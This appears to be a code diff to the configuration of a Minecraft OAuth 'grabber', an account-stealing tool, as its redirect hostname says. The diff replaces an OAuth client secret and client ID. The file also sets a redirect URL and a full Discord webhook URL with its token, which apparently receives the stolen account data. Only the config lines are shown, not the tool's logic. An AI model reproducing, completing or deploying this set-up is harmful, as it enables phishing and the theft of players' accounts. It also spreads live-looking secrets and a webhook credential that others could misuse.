@@ -1,6 +1,6 @@
 //Config
-const client_secret = '3kV8Q~JuS3gpWsTZNMk7rfNtWKsTUWnTJwhGkbwr'
-const client_id = '4aa07376-01b1-4d4f-815d-c5c0dded6f19'
+const client_secret = 'e838129a-9144-468e-b5a9-4c983de7ca58'
+const client_id = '1abbd93e-c40a-48c5-a8f3-2be4e7316aaf'
 const redirect_uri = 'https://minecraft-oauth-grabber-mog-87m0.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1231175751844237392/H2OmObsFGXfP9aurncKhTPQiX4xND-qXIiQcu010cBbPHyy0jTUJwqiQwrdaXfBqZKA2'
 //Requirements
